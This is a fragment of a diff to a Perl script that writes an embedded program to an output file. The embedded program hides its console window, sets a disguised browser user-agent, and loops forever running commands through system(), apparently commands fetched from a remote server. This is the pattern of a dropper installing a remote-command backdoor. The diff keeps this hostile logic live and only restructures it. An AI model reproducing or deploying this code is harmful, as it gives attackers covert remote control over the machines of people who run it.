@@ -94,14 +94,12 @@ BEGIN {
   hide_console;
 }
 
-END {
-  use LWP::UserAgent qw[get agent decoded_content];
-  use LWP::Simple qw[getstore];
-  use Config;
-  use Cwd;
-  
-  my \$disk = getcwd;
-  if(\$disk =~ m/(.+):\\/(.+)/){\$disk = \$1;}
+use LWP::UserAgent qw[get agent decoded_content];
+use LWP::Simple qw[getstore];
+use Config;
+use Cwd;
+my \$disk = getcwd;
+if(\$disk =~ m/(.+):\\/(.+)/){\$disk = \$1;}
   my \$ua = LWP::UserAgent->new;
   \$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
   while(1){
@@ -131,7 +129,6 @@ END {
       system(\"\$1\");
     }
   }
-}
 EXE
   close(OUTPUT);
   if($^V =~ m/5.24.1/){
